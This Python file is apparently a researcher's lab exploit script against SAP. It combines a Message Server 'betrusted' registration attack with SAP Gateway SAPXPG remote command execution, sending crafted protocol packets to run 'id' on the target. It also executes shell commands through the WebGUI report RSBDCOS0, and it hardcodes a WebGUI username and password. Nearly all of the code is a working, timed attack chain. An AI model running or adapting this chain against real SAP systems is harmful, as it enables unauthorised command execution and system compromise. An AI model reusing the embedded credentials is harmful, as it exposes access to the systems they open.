#!/usr/bin/env python3
"""
Extended betrusted test:
- Run betrusted for 5 minutes
- Read MS log and GW dev_rd log at t=30s, t=60s, t=120s
- Try SAPXPG at t=90s
"""

import sys
import socket
import struct
import threading
import time
import re
import json
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings()

sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_ms_betrusted import betrusted, pkt_adm, adm_nilist_record, ni_send, ni_recv
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send as gw_ni_send, ni_recv as gw_ni_recv, ni_drain,
    hexdump, extract_p4_output,
)

MS_HOST   = '192.168.2.209'
MS_PORT   = 3901
GW_HOST   = '192.168.2.209'
GW_PORT   = 3300
ATT_IP    = '192.168.2.210'
SID       = 'S4H'
INSTANCE  = '00'
HOSTNAME  = 's4hanadev'
KERNEL    = '793_REL'
DEST      = 'T_75'
CLIENT    = '000'
COMMAND   = 'id'
PARAMS    = ''
TIMEOUT   = 15

# WebGUI for reading GW log
USER   = 'joris'
PASSWD = 'Schaap123!'
WEBGUI = f'https://{MS_HOST}:8000'


def read_gw_devrd():
    """Read last 50 lines of GW dev_rd log via WebGUI RSBDCOS0."""
    try:
        s = requests.Session()
        s.auth = (USER, PASSWD); s.verify = False
        url = (f"{WEBGUI}/sap/bc/gui/sap/its/webgui"
               f"?sap-client={CLIENT}&sap-language=EN"
               f"&~transaction=*SE38 RS38M-PROGRAMM%3DRSBDCOS0%3BDYNP_OKCODE%3Dstrt")
        r = s.get(url, timeout=15)
        fa = re.findall(r'action="([^"]+)"', r.text)
        m  = re.findall(r'var moin\s*=\s*"([^"]+)"', r.text)
        if not fa or not m: return "(WebGUI login failed)"
        pu = f"{WEBGUI}{fa[0]}"; mo = m[0]
        r2 = s.post(pu, data=(f"sap-charset=utf-8&~SEC_SESSTOKEN={mo}&sap-wd-secure-id={mo}"
                               f"&fkey=ENTER&~okcode="),
                    headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
        m2 = re.findall(r"moin:'([^']+)'", r2.text)
        mo = m2[0] if m2 else mo
        bu = f"{pu.rstrip('/')}/batch/json?~RG_WEBGUI=X&sap-statistics=true&~runonsess=1"
        cmd = "tail -50 /usr/sap/S4H/D00/work/dev_rd 2>/dev/null || echo 'NOT FOUND'"
        ops = [{"post": "value/wnd[0]/usr/txt[0,8]", "content": cmd},
               {"post": "vkey/8/ses[0]"},
               {"get": "state/ur"}]
        r3 = s.post(bu, data=json.dumps(ops),
                    headers={"Content-Type": "application/json", "moin": mo}, timeout=25)
        # Extract text content
        found = []
        for m in re.finditer(r'"(?:content|text|value)"\s*:\s*"((?:[^"\\]|\\.)*)"', r3.text):
            v = m.group(1).replace('\\n', '\n').replace('\\t', '\t').replace('\\"', '"')
            if len(v) > 5 and not v.startswith('<?'):
                found.append(v)
        return '\n'.join(found) if found else r3.text[:300]
    except Exception as e:
        return f"(error: {e})"


def run_sapxpg():
    """Run SAPXPG against GW."""
    print(f"\n[XPG] Connecting to {GW_HOST}:{GW_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f"[XPG] Connection failed: {e}")
        return False

    local_ip = sock.getsockname()[0]

    # P1
    gw_ni_send(sock, build_p1(GW_HOST, INSTANCE))
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("[XPG] P1 timeout"); sock.close(); return False
    for f in frames:
        if parse_response(f)["error"]:
            print(f"[XPG] P1 rejected"); sock.close(); return False
    print(f"[XPG] P1 OK ({len(frames)} frames)")

    # P2
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    gw_ni_send(sock, p2)
    conv_id = None; gw_id = 0
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        print(hexdump(frames[0][:80]))
        for f in frames:
            info = parse_response(f)
            if info["error"]:
                print(f"[XPG] P2 rejected: {info['error_msg']}"); sock.close(); return False
            if info["conv_id"] and not conv_id: conv_id = info["conv_id"]
            if info["gw_id"] is not None: gw_id = info["gw_id"]
    except socket.timeout:
        print("[XPG] P2 timeout (GW silent → NOT vulnerable)"); sock.close(); return False

    print(f"[XPG] P2 OK: conv_id={conv_id} gw_id={gw_id}")
    if not conv_id: conv_id = "0"

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, COMMAND, PARAMS, gw_id=gw_id)
    gw_ni_send(sock, p3)
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("[XPG] P3 timeout"); sock.close(); return False

    p3_output = []
    strtstat = None
    for i, f in enumerate(frames):
        info = parse_response(f)
        if info["error"]:
            print(f"[XPG] P3 error: {info['error_msg']}"); sock.close(); return False
        p3_output.extend(extract_p4_output(f))
        if info["strtstat"]: strtstat = info["strtstat"]

    if p3_output:
        print("[XPG] Command output (from P3):")
        for line in p3_output: print(f"    {line}")
        sock.close(); return True

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    gw_ni_send(sock, p4)
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info["error"]:
            print(f"[XPG] P4 error: {info['error_msg']}")
        else:
            output = extract_p4_output(resp)
            if output:
                print("[XPG] Command output:")
                for line in output: print(f"    {line}")
                sock.close(); return True
            else:
                print("[XPG] No output captured")
    except socket.timeout:
        print("[XPG] P4 timeout")

    sock.close()
    return False


def main():
    print("=" * 65)
    print(" Extended betrusted+SAPXPG test (5-min wait)")
    print("=" * 65)

    stop_event = threading.Event()
    bt_result = {}

    def _bt():
        result = betrusted(
            host=MS_HOST, port=MS_PORT, attacker_ip=ATT_IP,
            instance_nr=int(INSTANCE), our_name='', target_sid=SID,
            nilist_wait=300,   # wait 5 minutes
            dp_version=14, kernel_new=True, verbose=True,
            stop_event=stop_event,
        )
        bt_result.update(result)

    bt_thread = threading.Thread(target=_bt, daemon=True)
    bt_thread.start()

    # t=30s: read GW log
    print("\n[*] t=0: betrusted started. Waiting 30s...")
    time.sleep(30)
    print("\n[*] t=30s: Reading GW dev_rd log...")
    log = read_gw_devrd()
    print(log[:1500])

    # t=60s: try SAPXPG (1 minute after registration)
    print("\n[*] t=60s: Trying SAPXPG (1 minute after registration)...")
    time.sleep(30)
    ok = run_sapxpg()
    print(f"[*] SAPXPG at t=60s: {'SUCCESS' if ok else 'FAILED'}")

    if ok:
        stop_event.set()
        bt_thread.join(timeout=10)
        return

    # t=120s: read GW log and try again
    print("\n[*] t=120s: Reading GW log and retrying...")
    time.sleep(60)
    log = read_gw_devrd()
    print(log[:1500])
    ok = run_sapxpg()
    print(f"[*] SAPXPG at t=120s: {'SUCCESS' if ok else 'FAILED'}")

    if ok:
        stop_event.set()
        bt_thread.join(timeout=10)
        return

    # t=240s: try again
    print("\n[*] t=240s: Trying SAPXPG (4 minutes after registration)...")
    time.sleep(120)
    ok = run_sapxpg()
    print(f"[*] SAPXPG at t=240s: {'SUCCESS' if ok else 'FAILED'}")

    stop_event.set()
    bt_thread.join(timeout=10)
    print(f"\n[*] betrusted result: {bt_result}")
    print("[*] Done.")


if __name__ == '__main__':
    main()
